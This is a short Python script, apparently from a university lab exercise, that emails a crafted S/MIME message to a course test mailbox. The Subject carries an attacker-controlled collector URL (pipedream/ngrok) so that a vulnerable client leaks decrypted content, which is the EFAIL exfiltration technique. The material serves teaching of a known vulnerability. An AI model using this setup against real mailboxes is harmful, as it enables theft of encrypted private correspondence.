import smtplib

# Insert your credentials: UPB loginID and password. You can also use a different mail server
password = ""  # you can alo use getpass.getpass() to ask for the password interactively

# Check your Gmail email address
sender = "*@gmail.com"

# No changes here
receiver = "efail.rub@mail.de"

# This is the original email (from encmail.eml)
# Insert the modified email content
# Change "Subject" to your personal URL e.g. a ngrok address
# Subject: http://xxxxxxxx.ngrok.io

message = """From: sender.efail.upb@mail.de
To: efail.rub@mail.de
Subject: https://eo8owroa5l53net.m.pipedream.net
Date: Fri, 10 Jul 2024 18:00:00 +0100
MIME-Version: 1.0
Content-Type: application/pkcs7-mime; smime-type=enveloped-data; name=smime.p7m
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=smime.p7m

MIIDLQYJKoZIhvcNAQcDoIIDHjCCAxoCAQAxggGxMIIBrQIBADCBljB+MQswCQYDVQQGEwJERTEM
MAoGA1UECAwDTlJXMQ8wDQYDVQQHDAZCb2NodW0xDDAKBgNVBAoMA1JVQjEMMAoGA1UECwwDTkRT
MRIwEAYDVQQDDAlSZWNpcGllbnQxIDAeBgkqhkiG9w0BCQEWEWVmYWlsLnJ1YkBtYWlsLmRlAhQN
twmb/MirMg0aAvxekg1ZDT4TkTALBgkqhkiG9w0BAQEEggEAIX2h4t6fIUKf1qWP4ozZzwuuYLUm
RdqwhhRXH7/9DiC0C+H5dDra6M9Nmv62HDZ7XNGPeWCXRX5Iai1UVaSubcQigFonjwYakfJKUbdp
YYhI5gEJLbv0DW9gm8sYVpRzzp4YnF9g9mltin1Lfr3RrKtWS3QSO8xZ1S25F7pknSoJ4C/uWRcX
+XMbjptu33MsRTFi7979H9EO/730g1UFnlr/ce3MH8pP40Jl0C+e4ncDoaB/M+uqUduYgkIOv+CU
qwlLR59RuKke/CDNtdsvDiIX5jAeLOoyysS2XhdccGSTUWQ9cBgFNOV+1hm+hcADu5i2nN10hFMD
SWRJU7StZzCCAV4GCSqGSIb3DQEHATAdBglghkgBZQMEASoEEMygX8ixIqXbo7tGShwkpveAggEw
lVcsQgxBLE2iI84M6DED+9IzEzAmZTEUCbbLi1HoGz0sagrieHp0x5Q7hfH4t8FzsmrJcfpRm2XF
/TaHz28yi5EgKCKdBnAyknon9fiKvBlUZsKnpT31IjcnOCLDdNNCn28EvcktP5JfWDESBtEpSOtI
Sz8hjL9nNF10SVy58oT4qU2GTQnXqS7xO1/kD5v9HD8mVS1MPeMOl0azvq1wYfjOz5giRV2Fo0+g
QPrmKVUAwOk5HfCHYTmKIlQuC25+taNBHdvDznLInav6CTmB9EZJHWiLhyii/+DIGKlV3TXVeYGX
tosi+3ZTQTUgTltodLQqTmlKOGnXZKaVDZZg28Rx+RjqHlq9mJK4Kb1kZ4qCXT2JCtkJjORkMF9B
fJ831Zaw33s9ohIGKWXn0y69sA==
"""

# If you use your UPB email address: no changes here
try:
    smtpObj = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    smtpObj.ehlo()
    # smtpObj.starttls()
    smtpObj.login(sender, password)
    smtpObj.sendmail(sender, receiver, message)
    print("Successfully sent email")
    smtpObj.close()
except smtplib.SMTPException as e:
    print("Error: unable to send email", e)
